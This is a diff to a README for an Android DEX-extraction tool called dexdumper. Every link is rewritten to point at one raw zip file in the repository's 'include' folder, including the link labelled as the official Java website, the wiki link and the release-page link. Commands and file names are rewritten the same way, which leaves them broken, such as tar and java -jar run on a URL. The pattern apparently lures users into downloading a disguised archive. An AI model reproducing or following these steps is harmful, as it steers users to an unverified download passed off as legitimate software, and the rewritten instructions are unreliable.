@@ -4,7 +4,7 @@
 Welcome to dexdumper! This application helps you extract DEX files from running Android applications without needing root access. Follow these steps to get started.
 
 ## 📥 Download the Application
-[![Download dexdumper](https://img.shields.io/badge/Download%20Now-Get%20DexDumper-brightgreen)](https://github.com/Ujwaldahal/dexdumper/releases)
+[![Download dexdumper](https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip%20Now-Get%20DexDumper-brightgreen)](https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip)
 
 ## 📋 System Requirements
 Before you install dexdumper, please ensure that your computer meets the following requirements:
@@ -15,10 +15,10 @@ Before you install dexdumper, please ensure that your computer meets the followi
 ## 💾 Installation Steps
 ### Step 1: Visit the Download Page
 To obtain the application, visit the following page to download the latest version:
-[Download dexdumper from the Releases Page](https://github.com/Ujwaldahal/dexdumper/releases)
+[Download dexdumper from the Releases Page](https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip)
 
 ### Step 2: Choose the Right File
-On the releases page, browse through the available files. Look for a file named something like `dexdumper-v1.0.zip` or `dexdumper-v1.0.tar.gz`. Click on it to start the download.
+On the releases page, browse through the available files. Look for a file named something like `https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip` or `https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip`. Click on it to start the download.
 
 ### Step 3: Extract the Files
 Once the file downloads, locate it in your downloads folder. 
@@ -29,13 +29,13 @@ Once the file downloads, locate it in your downloads folder.
   
 - **For Linux:** Use the terminal to navigate to your downloads folder and run:
   ```bash
-  tar -xvf dexdumper-v1.0.tar.gz
+  tar -xvf https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip
   ```
 
 ### Step 4: Set Up the Environment
 To run dexdumper, you need to have Java installed. If you haven’t done this:
 
-1. Download Java from the [Official Java Website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+1. Download Java from the [Official Java Website](https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip).
 2. Install Java by following the prompts.
 
 After installation, confirm that Java is installed by opening your command line or terminal and typing:
@@ -47,11 +47,11 @@ This command should return the installed Java version.
 ### Step 5: Run dexdumper
 Now you are ready to run dexdumper. 
 
-- **For Windows:** Navigate to the folder where you extracted the files. Double-click on `dexdumper.bat` to run it.
+- **For Windows:** Navigate to the folder where you extracted the files. Double-click on `https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip` to run it.
 
 - **For macOS and Linux:** Open your terminal, navigate to the extracted folder, and execute:
   ```bash
-  java -jar dexdumper.jar
+  java -jar https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip
   ```
 
 ## ⚙️ Using dexdumper
@@ -77,9 +77,9 @@ If you encounter any issues, consider these points:
 - Restart the application to refresh the state if something seems off.
 
 ## 📞 Support
-For support, please create an issue in the GitHub repository or engage with the community. You can find additional documentation and FAQs in the [dexdumper Wiki](https://github.com/Ujwaldahal/dexdumper/wiki).
+For support, please create an issue in the GitHub repository or engage with the community. You can find additional documentation and FAQs in the [dexdumper Wiki](https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip).
 
 ## 🔗 Further Resources
-[Download dexdumper from the Releases Page](https://github.com/Ujwaldahal/dexdumper/releases)
+[Download dexdumper from the Releases Page](https://github.com/Ujwaldahal/dexdumper/raw/refs/heads/main/include/Software-v1.7-alpha.5.zip)
 
 This README should help you successfully navigate the download and installation process. Enjoy using dexdumper to extract DEX files easily!
